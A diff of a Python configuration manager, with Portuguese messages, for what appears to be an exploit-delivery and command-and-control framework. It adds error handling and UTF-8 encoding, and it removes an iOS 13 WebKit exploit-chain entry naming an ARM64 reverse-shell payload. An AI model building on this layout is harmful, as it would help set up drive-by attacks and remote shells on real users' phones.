@@ -8,29 +8,22 @@ class ConfigManager:
 
     def _load_config(self):
         if os.path.exists(self.config_path):
-            with open(self.config_path, 'r') as f:
-                return json.load(f)
+            try:
+                with open(self.config_path, "r", encoding="utf-8") as f:
+                    return json.load(f)
+            except json.JSONDecodeError as e:
+                raise ValueError(f"Config inválido em '{self.config_path}': {e}") from e
         else:
             print(f"[*] Criando arquivo de configuração padrão em '{self.config_path}'.")
             default_config = {
-                "c2_ip": "0.0.0.0",
+                "c2_bind": "0.0.0.0",
                 "c2_port": 8080,
                 "web_server_ip": "0.0.0.0",
                 "web_server_port": 80,
                 "exploit_templates_dir": "exploits/",
                 "static_files_dir": "web_server/static/",
-                "webkit_exploit_chains": {
-                    "ios_13_x": {
-                        "name": "iOS 13.x WebKit Exploit Chain",
-                        "fingerprint": "user-agent-ios-13",
-                        "exploit_js": "ios13_exploit.js",
-                        "payload_stage1": "stage1.js",
-                        "rce_binary_name": "reverse_shell_arm64.bin"
-                    },
-                    # Adicione mais versões aqui conforme necessário
-                }
             }
-            with open(self.config_path, 'w') as f:
+            with open(self.config_path, "w", encoding="utf-8") as f:
                 json.dump(default_config, f, indent=4)
             return default_config
 
@@ -41,13 +34,10 @@ class ConfigManager:
         self.config[key] = value
 
     def save_config(self):
-        with open(self.config_path, 'w') as f:
+        with open(self.config_path, "w", encoding="utf-8") as f:
             json.dump(self.config, f, indent=4)
 
-# Exemplo de uso (para testar)
 if __name__ == "__main__":
     cm = ConfigManager()
-    print("IP do C2:", cm.get("c2_ip"))
-    cm.set("c2_ip", "192.168.1.100")
-    cm.save_config()
-    print("Novo IP do C2:", cm.get("c2_ip"))
+    for k, v in cm.config.items():
+        print(f"  {k}: {v}")
